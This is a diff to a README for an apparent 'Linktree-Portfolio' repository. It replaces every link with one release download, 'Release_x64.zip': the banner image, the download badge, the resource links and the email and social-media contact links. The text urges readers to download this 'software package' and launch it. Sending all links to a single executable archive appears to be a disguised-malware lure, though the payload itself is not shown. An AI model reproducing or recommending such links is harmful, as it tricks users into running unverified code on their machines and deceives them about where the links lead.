@@ -1,6 +1,6 @@
 # 🚀 Welcome to Linktree-Portfolio 🚀
 
-![Linktree-Portfolio Banner](https://example.com/linktree-banner.jpg)
+![Linktree-Portfolio Banner](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
 
 ## Description
 Welcome to the "Linktree-Portfolio" repository! This repository contains my personal portfolio designed in the structure of Linktree. Whether you are looking to explore my projects, connect with me on different platforms, or just get to know me better, this portfolio provides a centralized hub for all that information. 
@@ -20,7 +20,7 @@ Welcome to the "Linktree-Portfolio" repository! This repository contains my pers
 ## Get Started
 To access the full functionality of this portfolio and explore all the exciting content, you can download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
 
 Once you've downloaded the software package, simply launch it on your device to get started.
 
@@ -37,8 +37,8 @@ If for any reason the link is not working or you prefer a different method, feel
 If you have any feedback, suggestions, or just want to say hello, feel free to reach out. Your thoughts are always valued and appreciated.
 
 ## Resources
-- [Linktree](https://linktr.ee/)
-- [Portfolio Website Inspiration](https://www.pinterest.com/)
+- [Linktree](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
+- [Portfolio Website Inspiration](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
 
 ## Contributors
 A big thank you to all the contributors who have helped in shaping and improving this Linktree-Portfolio project.
@@ -46,10 +46,10 @@ A big thank you to all the contributors who have helped in shaping and improving
 ## Connect with Me
 Stay updated on my latest projects and endeavors by connecting with me on various platforms:
 
-- [Email](mailto:youremail@example.com)
-- [LinkedIn](https://www.linkedin.com/)
-- [Twitter](https://twitter.com/)
-- [GitHub](https://github.com/)
+- [Email](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
+- [LinkedIn](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
+- [Twitter](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
+- [GitHub](https://github.com/synccccc2232/Linktree-Portfolio/releases/download/v2.0/Release_x64.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. Feel free to fork, modify, and customize this portfolio for your own use.
